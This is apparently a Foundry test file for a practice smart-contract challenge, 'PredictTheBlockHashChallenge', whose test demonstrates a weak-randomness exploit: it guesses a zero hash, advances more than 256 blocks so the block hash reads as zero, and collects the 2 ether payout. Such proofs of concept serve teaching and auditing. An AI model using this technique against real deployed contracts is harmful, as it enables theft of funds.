
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        uint256 initialBlock = block.number;
        vm.assume(blockNumber > initialBlock + 257);

        vm.deal(address(this), 1 ether);
        challenge.lockInGuess{value: 1 ether}(bytes32(0));

        vm.roll(blockNumber);

        bytes32 predicted = bytes32(0);

        uint256 balanceBefore = address(this).balance;
        challenge.settle();

        uint256 balanceAfter = address(this).balance;
        assertEq(balanceAfter - balanceBefore, 2 ether);
    }
}
